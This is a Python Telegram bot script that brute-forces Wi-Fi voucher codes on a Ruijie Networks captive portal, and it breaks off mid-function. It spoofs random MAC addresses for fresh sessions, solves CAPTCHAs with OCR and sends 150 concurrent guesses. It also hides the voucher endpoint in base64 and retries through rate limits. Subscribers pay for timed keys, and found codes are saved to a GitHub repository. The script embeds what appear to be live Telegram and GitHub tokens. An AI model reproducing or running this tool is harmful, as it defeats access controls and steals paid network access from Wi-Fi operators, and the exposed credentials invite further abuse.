import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

BOT_TOKEN = '8773251112:AAEhnY-OMvJDz97-iPKz7VMeBChHAJ_2A3M'
GITHUB_TOKEN = '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'
ADMIN_ID = "6779617599"
REPO_OWNER = "kyawzin997692-lgtm"
REPO_NAME = "Kyawzin829941"
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
session = None
_connector = None
CONCURRENCY = 150  # လိုအပ်ချက်အရ 100 သို့ ပြောင်းထားပါသည်
_voucher_sem = None
_start_time = time.monotonic()

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    try:
        app = web.Application()
        app.router.add_get('/', handle)
        runner = web.AppRunner(app)
        await runner.setup()
        port = int(os.environ.get('PORT', 8099))
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        print(f"Web server started on port {port}")
    except Exception as e:
        print(f"Web server error: {e}")

async def get_file_content(path):
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=30)) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
    except Exception as e:
        print(f"get_file_content error for {path}: {e}")
    return {}, None

async def update_file_content(path, content, sha, message):
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Content-Type": "application/json"
        }
        encoded = base64.b64encode(json.dumps(content).encode()).decode()
        payload = {
            "message": message,
            "content": encoded,
            "sha": sha
        }
        async with session.put(url, headers=headers, json=payload, timeout=aiohttp.ClientTimeout(total=30)) as response:
            return await response.text()
    except Exception as e:
        print(f"update_file_content error for {path}: {e}")
        return None

@bot.message_handler(commands=['start'])
async def start(message):
    try:
        await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")
    except Exception as e:
        print(f"Start command error: {e}")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    try:
        global approve
        key = str(message.chat.id)
        auth_list, _ = await get_file_content("auth_list.json")
        if key in auth_list:
            valid = check_key_expiration(auth_list[key])
            if valid:
                approve[message.chat.id] = True
                user_data[message.chat.id] = {}
                await bot.reply_to(
                    message,
                    " Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။"
                )
            else:
                approve[message.chat.id] = False
                await bot.reply_to(
                    message,
                    " Key Expired ဖြစ်နေပါသည်။"
                )
        else:
            await bot.reply_to(
                message,
                " သင်၏ key ကို registered မလုပ်ရသေးပါ။"
            )
    except Exception as e:
        print(f"handle_key error: {e}")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        try: await bot.reply_to(message, "No Permission")
        except: pass
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        try: await bot.reply_to(message, "No Permission")
        except: pass
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Delete key for {user_id}"
        )
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(
            message,
            f" Key Deleted\n\nUSER ID : {user_id}"
        )
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        try: await bot.reply_to(message, "No Permission")
        except: pass
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/genkey 1h 123456789")
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(
                message,
                "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited"
            )
            return
        auth_list, sha = await get_file_content("auth_list.json")
        auth_list[user_id] = {
            "expires_at": expiry,
            "plan": plan
        }
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Add key for {user_id}"
        )
        await bot.reply_to(
            message,
            f" Key Generated\n\n"
            f"USER ID : {user_id}\n"
            f"PLAN : {plan}\n"
            f"EXPIRES : {expiry}"
        )
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if str(message.chat.id) in auth_list:
            results, _ = await get_file_content("result.json")
            chat_id_str = str(message.chat.id)
            if chat_id_str in results and results[chat_id_str]:
                codes = "\n".join(results[chat_id_str])
                await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
            else:
                await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။")
        else:
            await bot.reply_to(message, "သင်၏ key ကို registered မပြုလုပ်ရသေးပါ။")
    except Exception as e:
        print(f"handle_result error: {e}")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(
                expiry.replace("Z", "+00:00")
            )
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(
            int,
            expiration_time.split('-')
        )
        expiration_dt = datetime(
            year=yyyy,
            month=MM,
            day=dd,
            hour=hh,
            minute=mm,
            second=0,
            tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_current_time():
    return datetime.now(timezone.utc)

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    try:
        chat_id = message.chat.id
        if not approve.get(chat_id, False):
            await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
            return
        auth_list, _ = await get_file_content("auth_list.json")
        if str(message.chat.id) in auth_list:
            results, sha = await get_file_content("result.json")
            chat_id_str = str(message.chat.id)
            if chat_id_str in results and results[chat_id_str]:
                if message.chat.id not in user_data:
                    await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
                    return
                if "session_url" not in user_data[message.chat.id]:
                    await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
                    return
                codes = results[chat_id_str]
                await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
                session_url_recheck = user_data[message.chat.id]["session_url"]
                recheck_list = []
                for code in codes:
                    recode = await perform_check(
                        session_url_recheck,
                        code,
                        chat_id,
                        scan_id=None,
                        recheck=True,
                        message=message
                    )
                    if recode:
                        recheck_list.append(recode)
                to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
                await bot.reply_to(message, f"✅ Rechcked Codes:\n\n{to_show}")
                await save_rechecked_codes(chat_id_str, recheck_list, sha)
            else:
                await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
        else:
            await bot.reply_to(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")
    except Exception as e:
        print(f"recheck error: {e}")

async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    try:
        results, _ = await get_file_content("result.json")
        results[chat_id_str] = recheck_list
        await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")
    except Exception as e:
        print(f"save_rechecked_codes error: {e}")

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers, timeout=aiohttp.ClientTimeout(total=30)) as response:
            text_ = str(response.url)
            if "ruijienetworks.com" in text_ or "sessionId" in text_ or "stage=portal" in text_ or "gw_id" in text_:
                return True
            else:
                return False
    except Exception as e:
        print(f"check_session_url error: {e}")
        return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await bot.reply_to(
                message,
                "Usage:\n\n/input your_session_url"
            )
            return
        url = args[1].strip()
        if message.chat.id in user_data or message.chat.id:
            if message.chat.id not in user_data:
                user_data[message.chat.id] = {}
            await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
            if await check_session_url(session_url=url):
                user_data[message.chat.id]['session_url'] = url
                await bot.reply_to(message, "Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကိုရွေးပြီး စတင်ပါ။")
            else:
                await bot.reply_to(message, f"Session URL မှားယွင်းနေပါသည်။")
    except Exception as e:
        print(f"handle_input error: {e}")

@bot.message_handler(commands=['scan'])
async def scan(message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await bot.reply_to(
                message,
                "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>"
            )
            return
        mode = args[1]
        chat_id = message.chat.id
        if not approve.get(chat_id, False):
            await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
            return
        if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
            await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
            return
        session_url = user_data[chat_id]['session_url']
        scan_id = str(uuid.uuid4())
        scan_tasks[chat_id] = {
            "scan_id": scan_id,
            "stop": False
        }
        success_texts[chat_id] = []
        limited_texts[chat_id] = []
        success_messages.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        retry_counts[chat_id] = 0
        progress_msg = await bot.reply_to(message, "🔍 Scanning စတင်နေပါပြီ...")
        asyncio.create_task(
            run_bruteforce(mode, chat_id, session_url, scan_id, message, progress_msg)
        )
    except Exception as e:
        print(f"scan command error: {e}")

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    try:
        chat_id = message.chat.id
        if chat_id in scan_tasks:
            scan_tasks[chat_id]["stop"] = True
            scan_tasks.pop(chat_id, None)
            await bot.reply_to(message, "🛑 Scanning ကို ရပ်တန့်လိုက်ပါပြီ။")
        else:
            await bot.reply_to(message, "မည်သည့် scan task မျှ run မနေပါ။")
    except Exception as e:
        print(f"stop_scan error: {e}")

async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        try:
            await asyncio.sleep(80)
            items = []
            while not SUCCESS_CODE.empty():
                items.append(await SUCCESS_CODE.get())
            if items:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content(
                    "result.json",
                    results,
                    sha,
                    "Periodic Update"
                )
        except Exception as e:
            print(f"github_update_scheduler error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, limited=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍Scanning Codes...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Found : {found}\n"
            f"⚠️Limited : {limited}\n"
            f"🔁Retry : {retries}\n"
            f"[{bar}]"
        )
    return (
        f"🔍Scanning Codes...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Found : {found}\n"
        f"⚠️Limited : {limited}\n"
        f"🔁Retry : {retries}\n"
        f"📊Status : running\n"
    )

BATCH_SIZE = 2500

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            try:
                image = await Captcha_Image(session, session_id)
                if not image: continue
                text = await Captcha_Text(image)
                if not text: continue
                verified = await verify_captcha(session, session_id, text)
                if verified:
                    entry["session_id"] = session_id
                    entry["auth_code"] = text
                    return session_id, text
            except Exception as e:
                print(f"get_captcha loop error: {e}")
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        try: await bot.send_message(chat_id, str(e))
        except: pass
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                try:
                    auth_list, _ = await get_file_content("auth_list.json")
                    if (
                        str(chat_id) not in auth_list
                        or not check_key_expiration(auth_list[str(chat_id)])
                    ):
                        approve[chat_id] = False
                        await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                        scan_tasks.pop(chat_id, None)
                        return
                except: pass
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    try:
                        return await perform_check(session_url, code, chat_id, scan_id, message=message)
                    except Exception as e:
                        print(f"_check error for {code}: {e}")
                        return None

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            limited = len(limited_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            text = format_progress(checked, total, speed, found, limited, retries)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=text
                )
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except: pass

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_limited = len(limited_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            finish_text = (
                "🔍Scanning Completed\n\n"
                f"📦Checked : {checked:,}\n"
                f"✅Found : {final_found}\n"
                f"⚠️Limited : {final_limited}\n"
                f"🔁Retry : {final_retries}\n"
                "📊Progress : 100%\n"
                "[████████████████████]"
            )
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text
                )
            except:
                try: await bot.send_message(chat_id, finish_text)
                except: pass
    except Exception as e:
        print(f"run_bruteforce main error: {e}")
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    try:
        mac = get_mac()
        session_url = replace_mac(session_url, new_mac=mac)
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': session_url,
            'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        }
        async with session.get(session_url, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=30)) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
    except Exception as e:
        print(f"get_session_id error: {e}")
    return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    response = None
    for _attempt in range(3):
        try:
            async with aiohttp.ClientSession(
                connector=_connector,
                connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=30)
            ) as task_session:
                session_id = await get_session_id(task_session, session_url, None)
                if not session_id: continue

                auth_code = None
                for _ in range(8):
                    try:
                        image = await Captcha_Image(task_session, session_id)
                        if not image: continue
                        text = await Captcha_Text(image)
                        if not text: continue
                        verified = await verify_captcha(task_session, session_id, text)
                        if verified:
                            auth_code = text
                            break
                    except: continue
                if not auth_code: continue

                if not recheck:
                    current_task = scan_tasks.get(chat_id)
                    if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                        return

                data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
                headers = {
                    "authority": "portal-as.ruijienetworks.com",
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/json",
                    "origin": "https://portal-as.ruijienetworks.com",
                    "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                }
                async with task_session.post(post_url, json=data, headers=headers, timeout=aiohttp.ClientTimeout(total=30)) as req:
                    response = await req.text()
                    if 'request limited' in response:
                        retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
                        continue
                    break
        except Exception as e:
            print(f"perform_check attempt {_attempt+1} error: {e}")
            await asyncio.sleep(1)

    if not response: return

    try:
        if 'logonUrl' in response:
            if recheck: return code
            if chat_id not in success_texts: success_texts[chat_id] = []
            expire_date = await Code_Expires_Date(session_id)
            success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
            code_line = "\n\n".join(success_texts[chat_id])
            await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
            if message:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n{code_line}")
                    success_messages[chat_id] = sent.message_id
                else:
                    try: await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=f"Success Codes:\n\n{code_line}")
                    except:
                        sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n{code_line}")
                        success_messages[chat_id] = sent.message_id
        elif 'STA' in response:
            if chat_id not in success_texts: success_texts[chat_id] = []
            expire_date = await Code_Expires_Date(session_id)
            success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
            code_line = "\n\n".join(success_texts[chat_id])
            await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
            if message:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n{code_line}")
                    success_messages[chat_id] = sent.message_id
                else:
                    try: await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=f"Success Codes:\n\n{code_line}")
                    except:
                        sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n{code_line}")
                        success_messages[chat_id] = sent.message_id
        elif 'request limited' in response or 'limit' in response.lower():
            if chat_id not in limited_texts: limited_texts[chat_id] = []
            limited_texts[chat_id].append(f"⚠️ {code} (Limited)")
            limited_line = "\n\n".join(limited_texts[chat_id])
            if message:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id=message.chat.id, text=f"Limit Codes:\n\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    try: await bot.edit_message_text(chat_id=message.chat.id, message_id=limited_messages[chat_id], text=f"Limit Codes:\n\n{limited_line}")
                    except:
                        sent = await bot.send_message(chat_id=message.chat.id, text=f"Limit Codes:\n\n{limited_line}")
                        limited_messages[chat_id] = sent.message_id
    except Exception as e:
        print(f"perform_check response processing error: {e}")

def Minute_to_Hour(total_minutes):
    try:
        if total_minutes == 'Unknown': return 'Unknown'
        hours = int(total_minutes) // 60
        minutes = int(total_minutes) % 60
        if hours > 0 and minutes > 0: return f"{hours}h {minutes}m"
        elif hours > 0: return f"{hours}h"
        else: return f"{minutes}m"
    except: return 'Unknown'

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={session_id}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=15)) as fresh_session:
            async with fresh_session.get(f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', headers=headers) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        print(f"Code_Expires_Date error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None: return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        result = _ocr.classification(buffer.tobytes())
        return result.upper()
    except: return None

async def Captcha_Text(image_bytes):
    try: return await asyncio.to_thread(_ocr_sync, image_bytes)
    except: return None

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    try:
        async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as req:
            return await req.read()
    except: return None

async def verify_captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    try:
